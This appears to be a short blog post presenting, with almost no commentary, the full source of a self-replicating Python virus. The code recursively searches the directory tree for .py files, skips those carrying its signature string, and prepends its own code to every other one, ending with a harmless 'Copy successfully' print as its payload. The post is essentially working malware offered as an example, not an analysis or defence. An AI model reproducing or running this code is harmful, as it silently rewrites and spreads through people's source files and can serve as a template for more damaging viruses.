---
layout: post
title: python virus example
categories: [CS, PYTHON]
tags: [python]
---
A virus which can copy itself to another files.<!-- more -->
```python
import os
#Be usedd to identify that file is infected or not.
SIGNATURE = "PYTHON VIRUS"
def search(path):
    filestoinfect = []
    #listdir() returns a list containing the names of the entries
    #in the directory given by path. The list is in arbitrary order.
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        #Only work for .py file.
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
def bomb():
    print("Copy successfully")
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
```  
